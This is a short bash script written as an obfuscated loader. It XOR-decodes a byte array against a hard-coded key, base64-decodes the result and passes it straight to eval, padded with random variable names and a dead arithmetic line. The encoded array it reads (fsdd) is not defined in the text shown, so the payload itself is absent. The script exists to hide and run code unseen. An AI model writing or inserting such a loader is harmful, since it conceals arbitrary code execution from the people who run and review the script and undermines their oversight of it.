op96m=(111 175 182 141 189 78 115 166 79 187 186 67 88 160 180 153)
a9w9=$(printf '%d' $((RANDOM % 256)))
hhbdiy="vgnftwly"

xbcvawn() {
    local _r=""
    local _kl=${#op96m[@]}
    for ojhv1zu in $(seq 0 $((${#fsdd[@]} - 1))); do
    : $(( ojhv1zu ^ 13 ))
        local _b=$((${fsdd[$ojhv1zu]} ^ ${op96m[$(($ojhv1zu % $_kl))]}))
        _r="$_r$(printf "\\$(printf '%03o' $_b)")"
    done
    echo "$_r"
}

eval "$(echo "$(xbcvawn)" | base64 -d)"
